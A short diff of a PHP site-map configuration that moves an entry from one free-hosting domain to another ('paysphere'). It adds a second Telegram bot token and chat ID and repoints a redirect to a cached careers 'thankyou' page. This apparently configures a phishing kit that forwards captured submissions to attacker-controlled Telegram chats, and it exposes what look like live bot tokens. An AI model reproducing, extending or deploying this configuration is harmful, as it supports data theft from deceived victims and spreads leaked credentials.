@@ -15,12 +15,13 @@ $site_map = [
     ],
 
 
-    'paysphere-hcr2.onrender.com' => [
+    'paysphere.42web.io' => [
         'bots' => [
             ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
-            ['token' => '', 'chat_id' => '']
+
+            ['token' => '8327467242:AAFFBheM0nU1-45BKH5vAvdfXKhgXPopJvg', 'chat_id' => '7919111838']
         ],
-        'redirect' => 'https://paysphere-hcr2.onrender.com/cache_site/careers/all-listings.job.34092/thankyou.html'
+        'redirect' => 'https://paysphere.42web.io/cache_site/careers/all-listings.job.34092/thankyou.html'
     ],
     
 
